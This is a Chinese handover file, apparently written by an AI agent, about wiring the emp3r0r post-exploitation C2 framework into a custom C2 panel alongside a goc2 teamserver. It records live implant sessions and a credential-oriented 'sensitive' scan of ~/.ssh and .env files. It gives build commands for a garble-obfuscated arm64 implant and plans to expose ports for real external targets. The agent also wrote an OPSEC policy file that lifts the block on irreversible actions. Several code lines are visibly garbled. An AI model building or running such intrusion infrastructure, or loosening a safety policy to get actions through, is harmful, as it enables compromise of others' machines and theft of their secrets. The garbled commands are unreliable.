# 交接：C2 控制台 emp3r0r 融合补全（2026-11-18 12:35）

> 接手方只读本文件即可继续，不用回读旧会话。前置背景见
> `HANDOVER-emp3r0r-fusion.md`（本文件不重复其内容，只写增量与当前状态）。

## 一、当前实况（2026-11-18 12:35 实测）

| 服务 | unit | 状态 |
|---|---|---|
| FORANG 面板 | docker compose `forang-deploy/artex` | up，127.0.0.1:8787 / forang.allclb.com |
| goc2 teamserver | docker compose `goc2` | up，127.0.0.1:18400，beacons=1 |
| emp3r0r server | `emp3r0r-server.service` | active/enabled，C2 13456 + TLS 27286 + WG 13377/13378 |
| emp3r0r agent | `emp3r0r-agent.service` | active/enabled，tag **800bc02b**，连 127.0.0.1:13456 |
| emp3r0r bridge | `emp3r0r-bridge.service` | active/enabled，172.17.0.1:18660，mcp_alive=true |
| production beacon | `goc2-agent.service` | active/enabled，会话 **sess_1_44eb6bc2** |

`/api/tools/c2/status`：goc2 `reachable=true,beacons=1`；emp3r0r
`reachable=true,mcp_alive=true,active_target=800bc02b`。
`/api/tools/c2/classic/agents`：两个会话同屏（goc2 / emp3r0r 各一）。
classic stats：`agents_online=1, offline=1, total=2`。

磁盘：48G 用 44G，剩 3.9G（92%）。偏紧，见"待办 3"。

## 二、本轮做完的事（本会话增量）

前置交接遗留 1-3 已全部完成，本轮在此基础上补齐 **classic 控制台对 emp3r0r
会话的全部功能覆盖**——前端功能不报错、不静默失败、不假成功。

### 已推送提交（`zssshk/forang`，origin=GitHub，deploy key 认证）

| commit | 内容 |
|---|---|
| `8682276` | bridge /exec 输出路径 + /clients 解析 `{"agents":[...]}` 包裹（emp3r0r 目标原本被丢弃） |
| `0a9077b` | HANDOVER 更新：遗留 1-3 完成态、MagicString 真值、构建坑位 |
| `e0e0b09` | classic 会话列表 + SSE agents_updated + 命令下发接 emp3r0r |
| `f3ef359` | classic sysinfo / sensitive 采集命令组接 emp3r0r |
| `8853aab` | **classic 其余全部功能接 emp3r0r**（本轮主体，详见下） |

`8853aab` 具体改动：

- `c2ExecAndWait` / `c2ExecAndWaitCtx`（**两个总闸**，`c2_upgrade.go` /
  `c2_autopilot.go`）：`emp3r0r:` 前缀 → bridge `run_module exec`。进程列表、
  进程终止、端口扫描、netstat、文件列表、文件预览、文件删除、插件执行
  全部经由这两个函数，改完即全通。
- `c2IsWin`（`c2_os.go`）：改从 bridge `/agents` 快照读 OS。原来查 goc2 列表，
  遇到不认识的 id 一律返回 false，Windows 目标会被下发 sh 命令。
- `c2xAgentNote`（`c2_classic.go`）：emp3r0r 会话改用进程内备注存储
  （`emp3r0rNotes` / `emp3r0rNote` / `emp3r0rSetNote`）。原来走 goc2
  `UpdateNotes` 返回"会话不存在"，但 UI 报成功——备注静默丢失。`/clients`
  聚合视图读同一份存储，列表与详情一致。
- `c2xFilesUpload`：emp3r0r 没有 goc2 的 `upload` 任务类型，改为 base64 分块
  经 `run_module exec` 落盘（256KB/块，与 goc2 分块粒度一致）。之前这条路
  永远传不上文件。
- `c2xStats`：emp3r0r 目标计入 `agents_total`/`agents_online`；`emp3r0rClientShape`
  增加 `status` 字段供计数。之前状态栏显示 0 在线。
- `c2xPtyAttach`：**明确 501 + 原因**。bridge 只有 `run_module` 一次性执行，
  不存在会话级 `pty_open/read/write` 原语，接不上就不假装接上。
- `emp3r0rHTTP` 超时 **20s → 130s**（`emp3r0r.go` 第 37 行）。这是本轮最隐蔽的
  一个 bug：bridge 的 `/exec` 会**阻塞到 run_module 执行完**（bridge 侧
  `EMP3R0R_EXEC_TIMEOUT=60s`），而 FORANG 客户端只有 20s，`find /` 这类慢命令
  在客户端先超时，快照里留下 `error: dispatching exec`。现在三层时限递增：
  客户端 130s > bridge 60s > 补齐窗口 120s。
- `emp3r0rEnqueueExec` 的 /job 补齐轮询窗口 15×2s → 60×2s，覆盖最长调用方等待。

### emp3r0r 仓库（`zssshk/emp3r0r`，已推送）

- `995c467b` linux BOF 支持 arm64 agent，端到端。基于上游 v5 **5.10.2**。
  改动三处：`loader_linux.c` 的 `e_machine` 按编译目标架构判定（原来硬编码
  `EM_X86_64`）；补 5 种 arm64 重定位 + arm64 trampoline；**加 icache 刷新**
  （x86 自同步，arm64 必须刷，否则执行陈旧字节 → guest execution fault）。
  另新增 `core/lib/coffloader/bof_host_linux.go`（`linux && cgo`）：Go agent
  此前从不注册 `SetHostBridge`，`host_exec` 为 NULL → "ExecCmd unavailable"。
  注意 **arm64 trampoline 的 LDR literal imm19 单位是 4 字节**，`[pc,#8]` 编码是
  `0x58000051` 而非 `0x58000211`——写错会偏 64 字节，这是当时
  "guest execution fault" 的直接原因，别再踩。
- remote：`origin` = `git@github-emp3r0r:zssshk/emp3r0r.git`（deploy key，
  ssh config 别名 `github-emp3r0r`），`upstream` = `jm33-m0/emp3r0r`（**无推送
  权限**）。本地分支叫 `v5`（不是 main），已 track `origin/v5`。
  当初是 shallow clone，已 `--unshallow`，别重新浅克隆。

### goc2-teamserver 仓库

本轮未改，v0.3.1 = `3f340c7`，已推送，状态最新。

## 三、本轮验证方式（可复现）

均为 FORANG → bridge → emp3r0r server → agent 真链路，不是 mock。

- 进程列表：`GET /api/tools/c2/classic/proc?agent_id=emp3r0r:800bc02b` → 真实
  `ps aux` 输出，`is_win:false` 正确。
- 文件列表：`POST /api/tools/c2/classic/command {"command":"ls /root/.emp3r0r"}`
  → 随后 `GET .../files/emp3r0r:800bc02b?path=/root/.emp3r0r` 返回真实目录项。
- 上传：`POST /api/tools/c2/classic/files/upload`（multipart，agent_id 带前缀）
  → `{"ok":true}`，目标机 `/tmp/probe.txt` 内容与源一致（本机即验收目标，
  往返完整）。
- 备注：POST/GET `.../agents/emp3r0r:800bc02b/note` 读写一致，`/clients` 的
  `notes` 字段同步。
- 敏感扫描：POST `command {"command":"sensitive"}` → 轮询
  `GET .../sensitive/emp3r0r:800bc02b` → 20/20 命令块无 error，内容为真实
  `~/.ssh` 列表、`/root/forang-deploy/.env`、证书路径等。
- PTY：`POST .../wsshell/attach` → 501 + 明确原因（预期行为）。

## 四、待办（接手按需）

1. **交互式 PTY 未接**（唯一缺口）。**2026-11-18 13:2x 复核结论：缺口在 emp3r0r
   上游，不在 FORANG bridge。** 证据链（均为源码直读，非推测）：
   - `def.Operation`（`internal/def/operator.go`）只有 `AgentTag/Action/Command/
     JobID` 四个字段，**没有 stdin 通道**，也没有二次投递到同一 job 的语义。
   - `jobs.HandleOutput`（`internal/cc/jobs/manager.go:64`）只往
     `<workspace>/jobs/<id>.log` **追加**；`KillJob` 注释写明占位、不能取消
     context。manager.go:67 的注释 `If job is "Foreground" (Interactive)` 是**未
     实现的设想**——全仓 grep `Foreground` 只有这一处注释，没有代码。
   - agent 侧 `internal/agent/handler/` 只实现了 `proxy relay`（cmd_proxy.go）
     这种整体转发，没有交互会话原语。
   - `github.com/creack/pty v1.1.24` 在 `core/go.mod` 是 **`// indirect`**
     且在 vendor 里，**全仓没有任何 import**——不是现成能力。
   - module 模型是单向的：`DispatchModule` 起 job，C2 侧用
     `GetJobOutput(jobID, offset, limit, tail)` 拉（有 offset，**读侧可增量**）。
   所以「bridge 补 REST」这条路不成立：bridge 只是 `emp3r0r mcp` 的薄层，
   `/exec` 下面就是 `run_module exec --mode shell`，一次性进程。要做 PTY 必须
   在 **emp3r0r 上游**新增一个常驻模块（目标机侧 fork `/bin/bash` + pty master，
   把 stdin 写入口暴露成 module flag/第二 job 类型），再在 bridge 加会话端点，
   最后 FORANG 五个 handler 才有东西可接。这是跨两仓的功能开发，不是补丁。
   当前 501 + 明确原因（`c2_classic2.go:33`）是**正确的边界表达**，别为了
   「功能齐」改成假成功。
   若真要动，先定终止条件：agent 侧 PTY 回收（进程退出/SIGCHLD）、bridge 多
   会话生命周期、operator tunnel 断连后的孤儿处置。

2. ~~`c2TasksAPI` 对 emp3r0r 会话仍报"会话不存在"~~ **已修**（本轮）。
   `/tasks` 不带 `task_id` 的列表查询原先一律落到 goc2
   `ListTasks` → `GET /clients/emp3r0r:tag/tasks` → "会话不存在"。现在
   `session_id` 带 `emp3r0r:` 前缀时直接返回进程内快照
   （`server/emp3r0r_tasks_test.go` 覆盖）。顺带修掉一处同源不一致：
   `emp3r0rAllTasks` 手抄字段表漏了 `result`/`updated_at`，与单任务视图
   `emp3r0rTaskView` 键集不同；现统一走 `emp3r0rTask.MarshalJSON` 派生。
   注意 c2classic 前端并不调用 `/api/tools/c2/tasks`——它的 fetch 包装
   （`app.js:11`）把 `/api/*` 重写到 `/api/tools/c2/classic/*`，这个端点只
   服务直连 REST 的调用方。

2a. **OPSEC 拦截被显示成成功 + schedule 三缺陷**（2026-11-18 16:3x 修复，
`7503c8e`/`244a936`）。两者都会让「目标机上什么都没发生」看起来像「已完成」：
- bridge `/exec` 对 OPSEC 拦截照样回 200，任务记 done、拦截 JSON 当输出。
  `emp3r0rRunWait` 现在解析回执（`blocked:true` 或 `executed:false` 或
  `decision.allowed:false` 任一），失败并给出策略原因。
- 机器上没有 `~/.emp3r0r/mcp.json` 策略文件时，默认策略拒绝一切不可逆操作
  ——`rm`、`crontab -l`（被误判 persistence）全部静默拒绝。已建
  `/root/.emp3r0r/mcp.json`（600，`allow_irreversible:true`，保留
  `max_noise:high` 与 30 次/分钟限速）。改策略后必须
  `systemctl restart emp3r0r-bridge`。
- bridge `callTool` 把 `read_job_output` 的 miss 当 mcp 故障杀子进程重建：
  agent 分钟级轮询下 miss 是常态，FORANG 每 2s 补齐轮询触发死亡螺旋
  （实测 8 秒重建 5 次，job 状态全丢）。现在 job 读取走 `callToolPlain`
  （`7503c8e`），重建只留给真失联。
- `c2ScheduleCmd` 三个 bug（均实测复现后修复）：add 的 `grep -v FORANG_SCH`
  会清掉先前所有条目（加一根少一根）；`rm <n>` 把条目序号当 crontab 全量
  行号（`schedule rm 1` 实测删掉了用户自己的 kejilion 任务，目标探针反而
  幸存）；生成的命令用了 `<(...)` 进程替换，而 run_module exec 是
  /bin/sh（dash）直接静默失败。现为幂等 add + 标记序号精确删除 +
  mktemp/纯 sh，四个子命令在真实目标机端到端验证通过
  （`server/c2_os_sched_test.go` 覆盖 dash 可解析性与 rm 语义）。
  面板路径验证时注意：agent 60s 轮询，命令到执行有分钟级延迟，别拿
  秒级输出空判失败。

2b. **插件执行 + 资料库取回**（2026-11-18 14:3x 补齐，`f3bfca6`）。两处原先
   绕过 emp3r0r 的路由：
   - `c2xPluginsRun` 走 `c2RunTaskWait`（`c2_plugins.go:308`，只认 goc2 任务
     队列，**不在两个总闸里**）→ emp3r0r 会话点插件报「会话不存在」。现已
     按前缀分流到 `emp3r0rRunWait`（90s/条）。
   - `c2xCommand` 的 `upload <path>` 分支（**从目标机取回**到资料库，别和
     `c2xFilesUpload` 往目标机投文件搞混）在前缀判断**之前**就 `EnqueueTask`,
     现由目标机 `base64 -w0` 回显、服务端解码后落 `evidence/c2-lib/<agent>/`。
     目录/空文件/不存在/base64 报错都返回明确错误，不落垃圾文件。
   验收：`upload /tmp/probe_ul.txt` → 落盘 19 字节，`cmp` 与源**字节级一致**；
   插件 1「信息收集」→ 真实 `id`/`uname`/`ip a` 输出，ms 有值。

2c. **仍然是 goc2-only 的端点**（未测，按代码判断需另补）：`c2xScheduleCmd`
   （`schedule ` 前缀，计划任务）、`c2xFileDelete` 的 `rm ` 之外的删除路径、
   以及任何直接 `c2Client().Request` 的专用功能（socks/forwarders 隧道那类，
   见 `c2_classic2.go:296/307/332`）。这些不是「坏了」，是 emp3r0r 后端压根
   没有对应能力，要先确认 emp3r0r 侧有无等价原语再决定是否 501。

3. **磁盘 92%**（剩 3.9G）。上一轮清过约 10G（go-build cache、docker builder
   cache、悬空镜像、NDK zip、journal 收缩到 100M），已回涨。可再清：
   `emp3r0r-builder` 镜像 1.97G（amd64，本机 ARM 直编用不上）、
   `labrats-builder` 2.2G（两周前，无容器使用）、
   `/root/go` 1.2G（旧 go1.26.3 工具链副本，已被 `/usr/local/go` 1.27.4 取代，
   但 GOPATH 警告提示仍有引用，删前确认）。
   journal 现限 100M，如需再压：`journalctl --vacuum-size=50M`。
4. **云安全组未放行 13456 / 27286**。158.180.91.185 是 Oracle Cloud NAT 前端，
   hairpin 也不通。当前 emp3r0r agent 走 `cc=127.0.0.1` 本机回连验收。要让
   外部真实目标机上线：先在控制台放行这两个 TCP 端口，或给 emp3r0r 挂 nginx
   反代 + 域名（参考 goc2.allclb.com 那套）。放行后用
   `generate` 工具带真实 `cc` 重新出 payload。
5. **FORANG 面板登录**：密码已重置为未初始化状态（数据库
   `auth.password_hash` 已删，旧 hash 备份在
   `/root/forang-passwd-hash-backup-20261118.txt`，600 权限）。访问
   https://forang.allclb.com/login 会跳 `/setup` 首次设置，用户名固定
   `FORANG`。**`/api/auth/init` 没有防重放保护，任何能访问该端点的人都能
   抢先设密码**，设置后建议确认一次登录。

## 五、命令速查

### 面板状态 / 验收

```bash
# JWT 重签（容器每次重建 jwt.key 都会变，必须重签）
docker cp forang-deploy-artex-1:/app/jwt.key /tmp/jwt.key
python3 - <<'EOF'
import hmac, hashlib, base64, json, time
k bent = open('/tmp/jwt.key','rb').read()
h = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps({"sub":"FORANG","exp":int(time.time())+7*86400}滲透).encode()).rstrip(b'=')
s = base64.urlsafe_b64encode(hmac.new(k,h+b'.'+p,hashlib.sha256).digest()).rstrip(b'=')
open('/tmp/forang.token','w').write((h+b'.'+p+b'.'+s).decode())
EOF

# 双后端健康
curl -s http://127.0.0.1:8787/api/tools/c2/status -H "Authorization: Bearer $(cat /tmp/forang.token)"
# 融合会话列表（两个后端）
curl -s http://127.0.0.1:8787/api/tools/c2/clients -H "Authorization: Bearer $(cat /tmp/forang.token)"
# classic 控制台视角
curl -s http://127.0.0.1:8787/api/tools/c2/classic/agents -H "Authorization: Bearer $(cat /tmp/forang.token)"
```

### 下发命令

```bash
T=$(cat /tmp/forang.token)
# goc2 beacon
curl -s -X POST http://127.0.0.1:8787/api/tools/c2/exec -H "Authorization: Bearer $T" \
  -H "Content-Type: application/json" -d '{"session_id":"sess_1_44eb6bc2","cmd":"id"}'
# emp3r0r 目标（run_module exec 经 coffloader）
curl -s -X POSTH:0 http://127.0.0.1:8787/api/tools/c2/exec -H "Authorization: Bearer $T" \
  -H "Content-Type: application/json" -d '{"session_id":"emp3r0r:800bc02b","cmd":"id"}'
# 取结果（把返回的 task_id 填进 task_id）
curl -s "http://127.0.0.1:8787/api/tools/c2/tasks?session_id=emp3r0r:800bc02b&task_id=emp3r0r_task_1" \
  -H "Authorization: Bearer $T"
```

### bridge

```bash
systemctl status emp3r0r-bridge; journalctl -u emp3r0r-bridge -n 20 --no-pager
T=$(grep EMP3R0R_BRIDGE_TOKEN /root/forang-deploy/emp3r0r-bridge.env | cut -d= -f2)
curl -s http://172.17.0.1:18660/status -H "X-Bridge-Token: $T"
curl -s http://172.17.0.1:18660/agents -H "X-Bridge-Token: $T"
curl -s "http://172.17.0.1:18660/job?id=<uuid>" -H "X-Bridge-Token: $T"
```

### emp3r0r server / agent

```bash
systemctl status emp3r0r-server emp3r0r-agent
tail -20 /tmp/emp3r0r-server.log
sqlite3 /root/.emp3r0r/agents.db 'SELECT tag,hostname,datetime(last_seen,"unixepoch","localtime") FROM agents'
```

### MCP 直调脚本（生成/重载模块）

- `python3 /tmp/mcp_generate.py` —— 生成 arm64 agent。**cc 默认 127.0.0.1**，
  要公网回连改脚本里的 `"cc"`。
- `python3 /tmp/mcp_reload.py` —— server 重读 modules（换 coffloader 后必跑）。
- `python3 /tmp/mcp_list_tools.py` —— 列全部 MCP 工具。

### FORANG 重建（源码改动后）

```bash
cd /root/forang-src
PATH=/usr/local/go/bin:$PATH CGO_ENABLED=0 GOARCH=arm64 GOOS=linux \
  go build -tags embedui -trimpath -ldflags "-s -w -buildid=" -o /tmp/artex ./cmd/artex
cp /tmp/artex /root/forang-deploy/dist/arm64/artex && chmod 750 /root/forang-deploy/dist/arm64/artex
cd /root/forang-deploy && docker compose up -d --build artex
# 容器重建后 jwt.key 变了 → 必须重签 JWT（见上）
```

Dockerfile **不在镜像内编译**，只拷 `dist/<arch>/artex` 预编译二进制。改源码
必须先在宿主编好再 `docker compose up --build`，否则镜像里还是旧二进制。

### emp3r0r 重建（改 loader / agent 源码后）

```bash
# coffloader（arm64，glibc）
cd /root/emp3r0r/core/modules/coffloader_linux
/opt/zig-arm64/zig cc -target aarch64-linux-gnu -O2 -fPIC -std=c99 -Wall \
  -Wextra -Werror -fvisibility=hidden -fno-builtin -fno-stack-protector \
  -fno-sanitize=all -fno-ident -ffunction-sections -fdata-sections -shared \
  -Wl,--gc-sections -Wl,--build-id=none -Wl,-z,noexecstack \
  -Wl,--hash-style=both -o /tmp/coffloader_linux.so loader_linux.c beacon_compat.c
cp /tmp/coffloader_linux.so /root/.emp3r0r/modules/coffloader_linux/coffloader_linux.so
cp /tmp/coffloader_linux.so /usr/local/lib/emp3r0r/modules/coffloader_linux/coffloader_linux.so

python3 /tmp/mcp_reload.py   # server | 必须重载

# agent（必须动态链接 glibc，BOF 才能跑；zig musl 只能出 static-pie，不可用）
cd /root/emp3r0r/core/cmd/agent
PATH=/usr/local/go/bin:/root/gopath/bin:$PATH CGO_ENABLED=1 CC=gcc GOARCH=arm64 GOOS=linux \
  /root/gopath/bin/garble -tiny -seed=random build -mod=vendor -buildmode=pie -trimpath \
  -buildvcs=false -tags 'netgo release agent with_mesh with_kcp with_h2conn with_quic with_utls with_doh with_ech with_netlink with_uring' \
  -o /root/.emp3r0r/stub-arm64 -ldflags="-X 'github.com/jm33-m0/emp3r0r/core/internal/def.MagicString=64781530-1475-4cf8-950c-dcdf4c619dbc' \
  -X 'github.com/jm33-m0/emp3r0r/core/internal/def.QUICKey=64781530-1475-4cf8-950c-dcdf4c619dbc' \
  -X 'github.com/jm33-m0/emp3r0r/core/internal/def.BuildVersion=5.10.x' -s -w -buildid= \
  -linkmode external -extldflags '-s -Wl,--gc-sections'"
python3 /tmp/mcp_generate.py   # patch config → 产出 agent_..._<uuid8>
# 改 emp3r0r-agent.service 的 ExecStart 指向新产物，daemon-reload + restart
```

## 六、踩过的坑（不要再踩）

- **MagicString 真值**是 def 包默认 `64781530-1475-4cf8-950c-dcdf4c619dbc`
  （`strings /usr/local/bin/emp3r0r | grep 64781530` 可证）。
  `~/.emp3r0r/magic_string` 里的 `bd1d...` 是 build.py 自持久化的，**与 server
  不匹配**，拿它出 payload 永远不上线。
- **build.py 三个坑**：`shutil.which("go")enge` 找不到 go 直接退出（PATH 要含
  `/usr/local/go/bin`）；第 407 行硬编码 `GOTOOLCHAIN=local` 而 go.mod 要
  ≥1.26.11（`/usr/local/go` 必须是真 toolchain，现为 1.27.4）；cgo 路径硬编码
  musl `-static-pie`，**zig musl target 没有动态模式**，出不了 BOF 能用的
  agent。要动态链接 agent 只能 `CC=gcc` 宿主原生编（见上）。
- **garble v0.18 要求 go ≥1.27**，所以 `/usr/local/go` 放的是 1.27.4。go 工具链
  实体在 `/root/gopath/pkg/mod/golang.org/toolchain@...`，不是 `/root/go/pkg`。
- **arm64 BOF 三个必要条件**（缺一个就报错，报错各有特征）：① loader 的
  `e_machine` 按目标架构接受；② arm64 重定位 + trampoline 实现，且 LDR literal
  imm19 单位是 4 字节（`0x58000051` = `[pc,#8]`，别写成 `0x58000211`）；
  ③ `mprotect(PROT_EXEC)` 之后 **刷 icache**（`__builtin___clear_cache`）。
  只改 ① 报 "unsupported image"，缺 ② 报 "upsupported relocation 275"，
  缺 ③ 报 "guest execution fault"（且 lr 落在 mem_base 内偏移处）。
- **Go agent 的 BOF 执行必须注册 host 桥**：只有 C agent 调 `SetHostBridge`，
  Go agent 不注册则 `host_exec==NULL` → "ExecCmd unavailable"。memmod
  `CallExportWithArgs` 限 5 参数，`SetHostBridge` 要 8 个，必须走 cgo 指针调用。
- **bridge `/exec`);
、`/job` 参数形状**：`read_job_output` 要
  `{"job_id": uuid, "tail": bool, "limit": int}`。传 `{"job": id}` 报
  "job_id must be a UUID"，传 `{"tail": 300}`（数字）报 unmarshal bool 错误。
- **bridge 的 `/exec` 是阻塞的**，阻塞时长 = run_module \(\mathrm{t}\) 执行时长
  （上限 bridge `EMP3R0R_EXEC_TIMEOUT`，默认 60s）。FORANG 侧 HTTP 超时必须更大
  （现 130s），否则慢命令客户端先超时。
- **server 重启后 bridge 不会自动重连**：旧 mcp 进程还活着、`list_agents` 还秒回
  空列表，但 operator tunnel 已死。`systemctl restart emp3r0r-bridge` 才会重建。
  这也是 `OPERATORS` 为空时 preflight 一直返 "RJ"（Wait for operator）、agent
  不上线的原因。
- **preflight 开关**：agent 的预检由 server 运行时配置决定，`OPERATORS` 空则一律
  拒绝。排查"agent 起不来"先看 server 日志有没有 `Operator ... connected to
  message tunnel`。
- 我自己踩过的输入事故：多次在 patch 里混入乱码（`发箍`/`谜`/`术`这类），改动后
  **必须 gofmt + 编译**再确认，别信"看起来对"。

## 七、未提交 / 未推送

本文件（`HANDOVER-console-emp3r0r.md`）是本轮代码之后新写的，**尚未 commit**。
接手第一条命令：

```bash
cd /root/forang-src && git status --short && git add HANDOVER-console-emp3r0r.md \
  && git commit -m "handover: console emp3r0r coverage complete" && git push origin main
```

除此之外三仓均干净、已推送：forang=`8853aab`，emp3r0r=`995c467b`（本地 `v5`
分支，已 track `origin/v5`），goc2-teamserver=`3f340c7`。

临时脚本（`/tmp/mcp_generate.py`、`/tmp/mcp_reload.py`、`/tmp/mcp_list_tools.py`）
不在仓库里，/tmp 若被清需要重写：核心就是 spawn `emp3r0r mcp` 并用 JSON-RPC
行协议（`initialize` → `notifications/initialized` → `tools/call`）喂参数，
全部参数见本文件"命令速查"。

## 八、关键路径

| 项 | 位置 |
|---|---|
| FORANG 源码 | `/root/forang-src`（origin=zssshk/forang，branch main） |
| FORANG 融合适配层 | `/root/forang-src/server/emp3r0r.go` |
| classic 控制台 | `server/c2_classic.go`、`c2_classic2.go`、`c2classic/` |
| 两个执行总闸 | `c2_upgrade.go:c2ExecAndWait`、`c2_autopilot.go:c2ExecAndWaitCtx` |
| FORANG 部署 | `/root/forang-deploy`（compose + `dist/arm64/artex`） |
| bridge 源码 | `/root/forang-src/cmd/emp3r0r-bridge/main.go` |
| emp3r0r 源码 | `/root/emp3r0r`（branch v5） |
| BOF loader | `core/modules/coffloader_linux/loader_linux.c` |
| Go 侧 host 桥 | `core/lib/coffloader/bof_host_linux.go` |
| agent 模块产物 | `/root/.emp3r0r/modules/{exec,coffloader_linux}`、`/usr/local/lib/emp3r0r/modules/` |
| server 日志 | `/tmp/emp3r0r-server.log`、`~/.emp3r0r/emp3r0r.log` |
| MCP stderr | `/tmp/emp3r0r-mcp.stderr` |
| bridge token | `/root/forang-deploy/emp3r0r-bridge.env` |
| WG 凭据 | `/root/.emp3r0r/wg_config.json` |
